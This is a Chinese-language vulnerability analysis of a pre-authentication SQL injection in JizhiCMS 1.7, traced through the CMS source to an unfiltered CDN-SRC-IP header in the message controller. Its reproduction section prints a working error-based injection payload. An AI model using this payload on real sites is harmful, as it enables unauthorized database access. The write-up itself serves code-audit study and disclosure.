# 极致CMS1.7 前台SQL注入（CNVD-2021-26000）

本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。

## 0x00 漏洞描述

最近在 CNVD 上看到的  CNVD-2021-26000，后边学弟给了一份大佬的分析文章，可惜后来找不到了，可以前台 `SQL` 注入，比较有意思。

## 0x01 漏洞影响

极致CMS1.7

## 0x02 漏洞分析

既然说是前台 `SQL` 注入，那么漏洞应该是出在 `Home` 文件夹下，那么就重点观察这下面的 `Controller` 

这里的 `SQL` 都是这样处理的

```php
M('message')->add($w);
```

这里的话，M 是一个函数，主要用来获取一个新的实例

```php
function M($name=null) {
	if(empty($name)){
		$path = 'FrPHP\lib\\Model';
		return $path::getInstance();
	}
    $name = ucfirst($name);
	if($name==''){
		return '缺少模型类！';
	}else{
		$table = $name;
		$name = APP_HOME.'\\'.HOME_MODEL.'\\'.$name.'Model';
		if(!class_exists($name)){
			$path = 'FrPHP\lib\\Model';
			return $path::getInstance($table);
		}else{
			return $name::getInstance($table);
		}
		
	}
}
```

大致意思是实例化 `Model`  类，并初始化数据表的名字，这个类在 `FrPHP/lib/Model.php`，这里提供了`add`, `delete` , `find`, `update` 等函数，这些函数分别实现了增删查改

接下来我们关注跟数据库操作有关的输入，其实我们可以直接，大部分的输入都是由 `frparam` 方法处理的，我们来看看这个方法，位于 `FrPHP/lib/Controller.php`

```php
public function frparam($str=null, $int=0,$default = FALSE, $method = null){
    $data = $this->_data;
    if($str===null) return $data;
    if(!array_key_exists($str,$data)){
        return ($default===FALSE)?false:$default;
    }

    if($method===null){
        $value = $data[$str];
    }else{
        $method = strtolower($method);
        switch($method){
            case 'get':
            $value = $_GET[$str];
            break;
            case 'post':
            $value = $_POST[$str];
            break;
            case 'cookie':
            $value = $_COOKIE[$str];
            break;
        } 
    }
    return format_param($value,$int);
}
```

可以看到 `$value` 的值可以来自于两部分，第一可以从 `$this->_data`中取出，而这个 `$this->_data` 来自于哪里呢，可以追溯到父类的初始化 `FrPHP/lib/Controller.php`

```php
public function __construct($param=null)
{
    $this->_controller = APP_CONTROLLER;
    $this->_action = APP_ACTION;
    $this->_data = $param;
```

也就是父类在初始化的时候传进来的值，我们可以搜索全局的 `controller` 初始化，发现位于 `FrPHP/Fr.php` 342 行 ，朝上看就可以看到，是从这里传值进来的

第二是如果存在 `$method` 时，可以取出相应的值，最后会执行函数 `format_param($value,$int)`

```php
function format_param($value=null,$int=0){
	if($value==null){ return '';}
	switch ($int){
		case 0://整数
			return (int)$value;
		case 1://字符串
			$value=htmlspecialchars(trim($value), ENT_QUOTES);
			if(!get_magic_quotes_gpc())$value = addslashes($value);
			return $value;
		case 2://数组
			if($value=='')return '';
			array_walk_recursive($value, "array_format");
			return $value;
		case 3://浮点
			return (float)$value;
		case 4:
			if(!get_magic_quotes_gpc())$value = addslashes($value);
			return trim($value);
	}
}
```

这里会根据传进来的 `int` 来判断是哪种类型的值，然后做对应的处理，这样防止了很多漏洞可能的发生，这里过滤的还是比较严格的，整数就会强行转整数，字符串就会`html` 实体化与转义，其他的也类似。数组会进入函数 `array_format` 进行 `html` 实体化等处理，这里有可能有问题的一点是，如果传进来的数组中有数字类型的，那有可能这个处理就不会起到作用，但这不是本文漏洞的重点

现在来找不依靠 `frparam` 方法可以直接传值进入`sql` 语句的点，成功找到一处，位于 `Home/c/MessageController.php` 

```php
if($_POST){

    $w = $this->frparam();
    $w = get_fields_data($w,'message',0);

    $w['body'] = $this->frparam('body',1,'','POST');
    $w['user'] = $this->frparam('user',1,'','POST');
    $w['tel'] = $this->frparam('tel',1,'','POST');
    $w['aid'] = $this->frparam('aid',0,0,'POST');
    $w['tid'] = $this->frparam('tid',0,0,'POST');

    if($this->webconf['autocheckmessage']==1){
        $w['isshow'] = 1;
    }else{
        $w['isshow'] = 0;
    }

    $w['ip'] = GetIP();
    $w['addtime'] = time();
    ...
    $res = M('message')->add($w);
    ...
```

这里可以看到，`$w` 数组会进入 `add` 方法，前面的值都是从 `frparam` 中获取，但是注意这里

```php
$w['ip'] = GetIP();
```

```php
function GetIP(){ 
  static $ip = '';
  $ip = $_SERVER['REMOTE_ADDR'];
  if(isset($_SERVER['HTTP_CDN_SRC_IP'])) {
    $ip = $_SERVER['HTTP_CDN_SRC_IP'];
  } elseif (isset($_SERVER['HTTP_CLIENT_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR']) AND preg_match_all('#\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}#s', $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) {
    foreach ($matches[0] AS $xip) {
      if (!preg_match('#^(10|172\.16|192\.168)\.#', $xip)) {
        $ip = $xip;
        break;
      }
    }
  }
  return $ip;
}
```

这里可以看到 `$ip` 的值可以由多个 `$_SERVER` 中的值得到，其他的值都不好伪造，但是我们可以伪造这个

```php
$ip = $_SERVER['HTTP_CDN_SRC_IP'];
```

查阅资料知道，我们可以通过添加 `header` 来伪造

```
CDN-SRC-IP: 127.0.0.1
```

这里没有规范他的输入，因此此处输入可控，最后进入 `$res = M('message')->add($w);`

```php
public function add($row)
{
   if(!is_array($row))return FALSE;
    $row = $this->__prepera_format($row);
    if(empty($row))return FALSE;
    foreach($row as $key => $value){
        if($value!==null){
            $cols[] = $key;
            $vals[] = '\''.$value.'\'';
        }
    }
    $col = join(',', $cols);
    $val = join(',', $vals);
    $table = self::$table;
    $sql = "INSERT INTO {$table} ({$col}) VALUES ({$val})";
    if( FALSE != $this->runSql($sql) ){
        if( $newinserid = $this->db->lastInsertId() ){
            return $newinserid;
        }else{
            $a=$this->find($row, "{$this->primary} DESC",$this->primary);
            return array_pop($a);
        }
    }
    return FALSE;
}
```

这个数据库代码没有什么过滤的地方，比较常规的数据库插入

## 0x03 漏洞复现

![](https://gitee.com/d5shenwu/nopic/raw/master/img/20210705223529.png)

很明显，可以报错注入，留个 `payload`

```sql
CDN-SRC-IP: 127.0.0.1' or updatexml(1,concat(0x7e,database(),0x7e),0) or '
```

## 0x04 总结

这个是看过大佬的文章后，找不到文章了，只好自己从头开始审计，也是比较好的运气，重新找到了这处漏洞，从这处漏洞可以知道，不仅仅只有 `GET` ，`POST`，`COOKIE` 可以进行操作，还有其他的也是可以的，还有就是一个`CMS` 中，可能大部分都会用同一个过滤比较严格的函数处理，但是还是会有漏网之鱼。

## 0x05 链接

环境与 `exp` 都可以在如下链接获取

### GitHub

https://github.com/d5shenwu/vulPOC



